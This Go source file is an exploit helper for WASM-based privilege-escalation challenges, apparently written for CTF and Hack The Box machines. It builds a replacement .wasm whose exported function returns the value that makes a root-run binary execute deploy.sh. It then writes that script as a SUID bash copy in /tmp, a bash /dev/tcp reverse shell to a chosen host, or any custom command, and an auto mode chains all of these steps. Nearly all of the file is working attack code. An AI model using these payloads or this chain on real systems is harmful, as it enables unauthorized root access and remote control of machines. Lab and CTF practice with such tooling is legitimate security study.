// wasm_pwn.go
//
// This tool covers the full workflow for WASM-based privilege escalation
// challenges where a privileged process loads a .wasm file, calls an exported
// function, and conditionally executes a shell script based on the return value.
//
// Typical challenge pattern (e.g. HTB Ophiuchi):
//   1. A Go/Rust/C binary runs as root (via sudo)
//   2. It loads main.wasm from CWD and calls an exported function (e.g. info())
//   3. If the return value matches an expected value, it runs deploy.sh
//   4. We control CWD, so we can swap both main.wasm and deploy.sh
//
// Modes:
//   inspect   — Decompile and list exports from a .wasm file
//   probe     — Call a specific exported function and show the return value
//   patch     — Generate a new .wasm where a named function returns a given value
//   shell     — Write a deploy.sh payload (SUID bash, reverse shell, or custom)
//   auto      — Run inspect → patch → shell in one shot
//
// Usage:
//   go run wasm_pwn.go <mode> [flags]
//
// Dependencies:
//   github.com/wasmerio/wasmer-go/wasmer
//
// Install deps:
//   go mod init wasm_pwn
//   go get github.com/wasmerio/wasmer-go/wasmer
//
// Build:
//   go build -o wasm_pwn wasm_pwn.go
//
// -----------------------------------------------------------------------------

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/tabwriter"

	wasm "github.com/wasmerio/wasmer-go/wasmer"
)

// -----------------------------------------------------------------------------
// Constants & Defaults
// -----------------------------------------------------------------------------

const (
	defaultWasmFile = "main.wasm"
	defaultFunction = "info"
	defaultExpected = "1"
	defaultOutput   = "main.wasm"
	defaultShell    = "deploy.sh"

	// WAT template for a minimal wasm module that exports a single
	// function returning a constant i32 value.
	//
	// Placeholders:
	//   %s = function name (e.g. "info")
	//   %d = return value  (e.g. 1)
	watTemplate = `(module
  (func $%s (export "%s") (result i32)
    i32.const %d)
)`

	// Shell payload templates
	payloadSUID = `#!/bin/bash
# SUID bash payload
# Creates a SUID copy of /bin/bash at /tmp/rootbash
# After the privileged binary runs, escalate with: /tmp/rootbash -p
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
echo "[+] Done. Run: /tmp/rootbash -p"
`

	payloadRevShell = `#!/bin/bash
# Reverse shell payload
# Replace LHOST and LPORT before deploying
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
`
)

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

// banner prints a section header to stdout.
func banner(title string) {
	fmt.Printf("\n\033[1;36m=== %s ===\033[0m\n", title)
}

// success prints a green success message.
func success(msg string) {
	fmt.Printf("\033[1;32m[+]\033[0m %s\n", msg)
}

// info prints a blue info message.
func info(msg string) {
	fmt.Printf("\033[1;34m[*]\033[0m %s\n", msg)
}

// warn prints a yellow warning message.
func warn(msg string) {
	fmt.Printf("\033[1;33m[!]\033[0m %s\n", msg)
}

// fatal prints a red error message and exits.
func fatal(msg string) {
	fmt.Printf("\033[1;31m[!]\033[0m %s\n", msg)
	os.Exit(1)
}

// checkWat2Wasm checks whether wat2wasm is available in PATH.
// Returns the resolved path or an empty string if not found.
func checkWat2Wasm() string {
	path, err := exec.LookPath("wat2wasm")
	if err != nil {
		return ""
	}
	return path
}

// writeFile writes content to a file path and sets permissions.
func writeFile(path, content string, perm os.FileMode) error {
	return os.WriteFile(path, []byte(content), perm)
}

// -----------------------------------------------------------------------------
// Mode: inspect
//
// Loads a .wasm binary, lists all exports (functions, globals, memory),
// and optionally decompiles using wasm-decompile if available in PATH.
//
// This is useful for understanding an unknown .wasm file before deciding
// which function to target and what return value to patch.
// -----------------------------------------------------------------------------

func modeInspect(args []string) {
	fs := flag.NewFlagSet("inspect", flag.ExitOnError)
	wasmFile := fs.String("wasm", defaultWasmFile, "Path to the .wasm file to inspect")
	decompile := fs.Bool("decompile", false, "Run wasm-decompile if available in PATH")

	fs.Usage = func() {
		fmt.Println("Usage: wasm_pwn inspect [flags]")
		fmt.Println()
		fmt.Println("Inspect a .wasm file — list exports and optionally decompile.")
		fmt.Println()
		fmt.Println("Flags:")
		fs.PrintDefaults()
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  wasm_pwn inspect")
		fmt.Println("  wasm_pwn inspect -wasm /opt/wasm-functions/main.wasm")
		fmt.Println("  wasm_pwn inspect -wasm main.wasm -decompile")
	}

	if err := fs.Parse(args); err != nil {
		log.Fatal(err)
	}

	banner("INSPECT: " + *wasmFile)

	// Read bytes
	bytes, err := wasm.ReadBytes(*wasmFile)
	if err != nil {
		fatal(fmt.Sprintf("Failed to read %q: %v", *wasmFile, err))
	}
	info(fmt.Sprintf("Read %d bytes from %s", len(bytes), *wasmFile))

	// Instantiate
	instance, err := wasm.NewInstance(bytes)
	if err != nil {
		fatal(fmt.Sprintf("Failed to instantiate wasm: %v", err))
	}
	defer instance.Close()

	// List exports
	banner("Exports")
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintln(w, "NAME\tTYPE\tNOTES")
	fmt.Fprintln(w, "----\t----\t-----")

	for name, export := range instance.Exports {
		exportType := "unknown"
		notes := ""

		// Try calling it — if it succeeds with no args it's likely a function
		result, callErr := export()
		if callErr == nil {
			exportType = "function"
			notes = fmt.Sprintf("returns: %s", result.String())
		} else {
			// Could be memory or global — just note the name
			exportType = "non-callable"
			notes = callErr.Error()
		}

		fmt.Fprintf(w, "%s\t%s\t%s\n", name, exportType, notes)
	}
	w.Flush()

	// Optional decompile
	if *decompile {
		banner("Decompile (wasm-decompile)")
		bin := ""
		for _, candidate := range []string{"wasm-decompile", "/opt/wabt/bin/wasm-decompile"} {
			if p, err := exec.LookPath(candidate); err == nil {
				bin = p
				break
			}
		}
		if bin == "" {
			warn("wasm-decompile not found in PATH or /opt/wabt/bin/. " +
				"Install WABT: https://github.com/WebAssembly/wabt")
		} else {
			out, err := exec.Command(bin, *wasmFile).Output()
			if err != nil {
				warn(fmt.Sprintf("wasm-decompile failed: %v", err))
			} else {
				fmt.Println(string(out))
			}
		}
	}

	success("Inspect complete")
}

// -----------------------------------------------------------------------------
// Mode: probe
//
// Calls a specific exported function from a .wasm file and prints the result.
// Compares the result against an expected value and clearly reports pass/fail.
//
// Useful for verifying your patched .wasm before deploying it.
// -----------------------------------------------------------------------------

func modeProbe(args []string) {
	fs := flag.NewFlagSet("probe", flag.ExitOnError)
	wasmFile := fs.String("wasm", defaultWasmFile, "Path to the .wasm file")
	fn := fs.String("fn", defaultFunction, "Exported function name to call")
	expected := fs.String("expect", defaultExpected, "Expected return value")

	fs.Usage = func() {
		fmt.Println("Usage: wasm_pwn probe [flags]")
		fmt.Println()
		fmt.Println("Call an exported function and compare its return value.")
		fmt.Println()
		fmt.Println("Flags:")
		fs.PrintDefaults()
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  wasm_pwn probe")
		fmt.Println("  wasm_pwn probe -wasm main.wasm -fn info -expect 1")
		fmt.Println("  wasm_pwn probe -wasm target.wasm -fn check -expect 42")
	}

	if err := fs.Parse(args); err != nil {
		log.Fatal(err)
	}

	banner("PROBE: " + *wasmFile)

	bytes, err := wasm.ReadBytes(*wasmFile)
	if err != nil {
		fatal(fmt.Sprintf("Failed to read %q: %v", *wasmFile, err))
	}

	instance, err := wasm.NewInstance(bytes)
	if err != nil {
		fatal(fmt.Sprintf("Failed to instantiate wasm: %v", err))
	}
	defer instance.Close()

	export, ok := instance.Exports[*fn]
	if !ok {
		warn(fmt.Sprintf("Function %q not found. Available exports:", *fn))
		for name := range instance.Exports {
			fmt.Printf("    - %s\n", name)
		}
		os.Exit(1)
	}

	result, err := export()
	if err != nil {
		fatal(fmt.Sprintf("Failed to call %q: %v", *fn, err))
	}

	val := result.String()
	info(fmt.Sprintf("Function : %s()", *fn))
	info(fmt.Sprintf("Result   : %s", val))
	info(fmt.Sprintf("Expected : %s", *expected))

	if val == *expected {
		success(fmt.Sprintf("MATCH — %s() returns %s as expected", *fn, val))
	} else {
		warn(fmt.Sprintf("MISMATCH — got %s, expected %s", val, *expected))
		os.Exit(1)
	}
}

// -----------------------------------------------------------------------------
// Mode: patch
//
// Generates a new .wasm file where a named exported function returns a
// specified i32 constant. Uses wat2wasm from WABT to compile.
//
// This is the core exploit step — replacing the target's main.wasm with one
// whose info() (or equivalent) returns the value that triggers the shell exec.
// -----------------------------------------------------------------------------

func modePatch(args []string) {
	fs := flag.NewFlagSet("patch", flag.ExitOnError)
	fn := fs.String("fn", defaultFunction, "Function name to export")
	retVal := fs.Int("val", 1, "i32 value the function should return")
	output := fs.String("out", defaultOutput, "Output .wasm file path")
	keepWat := fs.Bool("keep-wat", false, "Keep the intermediate .wat source file")

	fs.Usage = func() {
		fmt.Println("Usage: wasm_pwn patch [flags]")
		fmt.Println()
		fmt.Println("Generate a patched .wasm where fn() returns val.")
		fmt.Println()
		fmt.Println("Flags:")
		fs.PrintDefaults()
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  wasm_pwn patch")
		fmt.Println("  wasm_pwn patch -fn info -val 1 -out main.wasm")
		fmt.Println("  wasm_pwn patch -fn check -val 42 -out patched.wasm -keep-wat")
	}

	if err := fs.Parse(args); err != nil {
		log.Fatal(err)
	}

	banner("PATCH: Generating .wasm")

	// Build WAT source
	wat := fmt.Sprintf(watTemplate, *fn, *fn, *retVal)
	info(fmt.Sprintf("WAT source:\n%s", wat))

	// Write temporary .wat file
	watPath := strings.TrimSuffix(*output, filepath.Ext(*output)) + ".wat"
	if err := writeFile(watPath, wat, 0644); err != nil {
		fatal(fmt.Sprintf("Failed to write .wat file: %v", err))
	}
	info(fmt.Sprintf("Wrote WAT to: %s", watPath))

	// Find wat2wasm
	wat2wasm := ""
	for _, candidate := range []string{"wat2wasm", "/opt/wabt/bin/wat2wasm"} {
		if p := checkWat2Wasm(); p != "" {
			_ = p
		}
		if p, err := exec.LookPath(candidate); err == nil {
			wat2wasm = p
			break
		}
	}

	if wat2wasm == "" {
		warn("wat2wasm not found. Install WABT: https://github.com/WebAssembly/wabt")
		warn("Leaving .wat file in place — compile manually with:")
		warn(fmt.Sprintf("  wat2wasm %s -o %s", watPath, *output))
		os.Exit(1)
	}

	// Compile WAT → WASM
	cmd := exec.Command(wat2wasm, watPath, "-o", *output)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fatal(fmt.Sprintf("wat2wasm failed: %v", err))
	}

	success(fmt.Sprintf("Compiled: %s → %s", watPath, *output))
	success(fmt.Sprintf("Function %s() will return %d", *fn, *retVal))

	// Optionally remove .wat
	if !*keepWat {
		if err := os.Remove(watPath); err != nil {
			warn(fmt.Sprintf("Could not remove .wat file: %v", err))
		} else {
			info(fmt.Sprintf("Removed intermediate file: %s", watPath))
		}
	}

	success("Patch complete")
}

// -----------------------------------------------------------------------------
// Mode: shell
//
// Writes a deploy.sh payload to disk. Supports three payload types:
//
//   suid    — Copies /bin/bash to /tmp/rootbash with SUID bit set.
//             Escalate after execution with: /tmp/rootbash -p
//
//   revshell — Bash reverse shell. Set LHOST/LPORT flags before use.
//
//   custom   — Write an arbitrary command string into the script.
//
// Always sets the output file as executable (0755).
// -----------------------------------------------------------------------------

func modeShell(args []string) {
	fs := flag.NewFlagSet("shell", flag.ExitOnError)
	payloadType := fs.String("type", "suid",
		"Payload type: suid | revshell | custom")
	lhost := fs.String("lhost", "", "LHOST for reverse shell")
	lport := fs.String("lport", "4444", "LPORT for reverse shell")
	custom := fs.String("cmd", "", "Custom command for 'custom' payload type")
	output := fs.String("out", defaultShell, "Output script filename")

	fs.Usage = func() {
		fmt.Println("Usage: wasm_pwn shell [flags]")
		fmt.Println()
		fmt.Println("Write a deploy.sh payload.")
		fmt.Println()
		fmt.Println("Flags:")
		fs.PrintDefaults()
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  wasm_pwn shell -type suid")
		fmt.Println("  wasm_pwn shell -type revshell -lhost 10.10.14.5 -lport 9001")
		fmt.Println("  wasm_pwn shell -type custom -cmd 'chmod +s /bin/bash'")
	}

	if err := fs.Parse(args); err != nil {
		log.Fatal(err)
	}

	banner("SHELL: Writing payload")

	var content string

	switch *payloadType {
	case "suid":
		content = payloadSUID
		info("Payload type: SUID bash")
		info("After execution, escalate with: /tmp/rootbash -p")

	case "revshell":
		if *lhost == "" {
			fatal("LHOST is required for revshell payload. Use -lhost <ip>")
		}
		content = strings.ReplaceAll(payloadRevShell, "LHOST", *lhost)
		content = strings.ReplaceAll(content, "LPORT", *lport)
		info(fmt.Sprintf("Payload type: Reverse shell → %s:%s", *lhost, *lport))
		info(fmt.Sprintf("Start listener: nc -lvnp %s", *lport))

	case "custom":
		if *custom == "" {
			fatal("Custom command is required. Use -cmd '<command>'")
		}
		content = fmt.Sprintf("#!/bin/bash\n# Custom payload\n%s\n", *custom)
		info(fmt.Sprintf("Payload type: Custom → %s", *custom))

	default:
		fatal(fmt.Sprintf("Unknown payload type %q. Use: suid | revshell | custom", *payloadType))
	}

	if err := writeFile(*output, content, 0755); err != nil {
		fatal(fmt.Sprintf("Failed to write %s: %v", *output, err))
	}

	success(fmt.Sprintf("Payload written to: %s", *output))

	// Print the script contents for review
	banner("Script Contents")
	fmt.Println(content)
}

// -----------------------------------------------------------------------------
// Mode: auto
//
// Runs the full exploit chain in one shot:
//   1. Inspect the target .wasm — find the exported function
//   2. Patch — generate a new .wasm with the function returning the target value
//   3. Shell — write the deploy.sh payload
//   4. (Optional) Probe — verify the patched .wasm before deployment
//
// Designed for speed during CTF/HTB engagements.
// -----------------------------------------------------------------------------

func modeAuto(args []string) {
	fs := flag.NewFlagSet("auto", flag.ExitOnError)
	wasmFile := fs.String("wasm", defaultWasmFile, "Path to the target .wasm file")
	fn := fs.String("fn", defaultFunction, "Exported function name to target")
	retVal := fs.Int("val", 1, "Return value to patch into the function")
	payloadType := fs.String("type", "suid", "Shell payload type: suid | revshell | custom")
	lhost := fs.String("lhost", "", "LHOST for reverse shell")
	lport := fs.String("lport", "4444", "LPORT for reverse shell")
	custom := fs.String("cmd", "", "Custom command for custom payload type")
	outDir := fs.String("dir", ".", "Output directory for generated files")
	verify := fs.Bool("verify", true, "Probe patched .wasm before finishing")

	fs.Usage = func() {
		fmt.Println("Usage: wasm_pwn auto [flags]")
		fmt.Println()
		fmt.Println("Run the full inspect → patch → shell chain automatically.")
		fmt.Println()
		fmt.Println("Flags:")
		fs.PrintDefaults()
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  wasm_pwn auto")
		fmt.Println("  wasm_pwn auto -wasm /opt/wasm-functions/main.wasm -fn info -val 1")
		fmt.Println("  wasm_pwn auto -type revshell -lhost 10.10.14.5 -lport 9001")
	}

	if err := fs.Parse(args); err != nil {
		log.Fatal(err)
	}

	banner("AUTO: Full Exploit Chain")

	outWasm := filepath.Join(*outDir, "main.wasm")
	outShell := filepath.Join(*outDir, "deploy.sh")

	// Step 1 — Inspect
	info("Step 1/3: Inspecting target wasm")
	modeInspect([]string{"-wasm", *wasmFile})

	// Step 2 — Patch
	info("Step 2/3: Patching wasm")
	patchArgs := []string{
		"-fn", *fn,
		"-val", fmt.Sprintf("%d", *retVal),
		"-out", outWasm,
	}
	modePatch(patchArgs)

	// Step 2b — Optional verify
	if *verify {
		info("Verifying patched wasm...")
		modeProbe([]string{
			"-wasm", outWasm,
			"-fn", *fn,
			"-expect", fmt.Sprintf("%d", *retVal),
		})
	}

	// Step 3 — Shell payload
	info("Step 3/3: Writing shell payload")
	shellArgs := []string{"-type", *payloadType, "-out", outShell}
	switch *payloadType {
	case "revshell":
		shellArgs = append(shellArgs, "-lhost", *lhost, "-lport", *lport)
	case "custom":
		shellArgs = append(shellArgs, "-cmd", *custom)
	}
	modeShell(shellArgs)

	// Summary
	banner("Summary")
	success(fmt.Sprintf("Patched wasm  : %s  (%s() → %d)", outWasm, *fn, *retVal))
	success(fmt.Sprintf("Shell payload : %s  (type: %s)", outShell, *payloadType))
	fmt.Println()
	info("Next steps:")
	fmt.Printf("  1. cd %s\n", *outDir)
	fmt.Println("  2. sudo /usr/bin/go run /opt/wasm-functions/index.go")
	if *payloadType == "suid" {
		fmt.Println("  3. /tmp/rootbash -p")
	} else if *payloadType == "revshell" {
		fmt.Printf("  3. Catch shell on: nc -lvnp %s\n", *lport)
	}
}

// -----------------------------------------------------------------------------
// Entry Point
// -----------------------------------------------------------------------------

func usage() {
	fmt.Println(`
wasm_pwn — WebAssembly CTF/HTB Exploit Helper
=============================================

A tool for inspecting, patching, and exploiting WASM-based privilege
escalation challenges where a privileged binary loads a .wasm file and
conditionally executes a shell script based on a function's return value.

Modes:
  inspect   List exports and optionally decompile a .wasm file
  probe     Call an exported function and check its return value
  patch     Generate a patched .wasm with a function returning a given value
  shell     Write a deploy.sh payload (suid / revshell / custom)
  auto      Run the full chain: inspect → patch → shell

Usage:
  wasm_pwn <mode> [flags]
  wasm_pwn <mode> -h     (mode-specific help)

Examples:
  wasm_pwn auto
  wasm_pwn auto -type revshell -lhost 10.10.14.5 -lport 9001
  wasm_pwn inspect -wasm main.wasm -decompile
  wasm_pwn patch -fn info -val 1
  wasm_pwn shell -type suid
  wasm_pwn probe -wasm main.wasm -fn info -expect 1
`)
}

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	mode := os.Args[1]
	args := os.Args[2:]

	switch mode {
	case "inspect":
		modeInspect(args)
	case "probe":
		modeProbe(args)
	case "patch":
		modePatch(args)
	case "shell":
		modeShell(args)
	case "auto":
		modeAuto(args)
	case "-h", "--help", "help":
		usage()
	default:
		warn(fmt.Sprintf("Unknown mode: %q", mode))
		usage()
		os.Exit(1)
	}
}

//
//
